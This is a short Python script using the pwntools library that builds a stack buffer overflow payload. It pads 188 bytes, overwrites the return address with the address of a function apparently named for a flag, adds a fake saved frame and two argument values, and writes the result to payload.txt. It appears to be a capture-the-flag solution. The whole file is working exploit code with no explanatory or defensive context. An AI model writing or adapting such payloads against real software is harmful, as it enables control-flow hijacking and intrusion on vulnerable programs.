# payload-gen.py
from pwn import *

offset = 188
flag_addr = 0x080491e2
eip_addr = p32(flag_addr)
garbage = b'A'*offset

previous_frame = b'A'*4

param_1 = p32(0xdeadbeef)
param_2 = p32(0xc0ded00d)

payload = garbage + eip_addr + previous_frame + param_1 + param_2

with open("payload.txt", "wb") as file:
    file.write(payload)
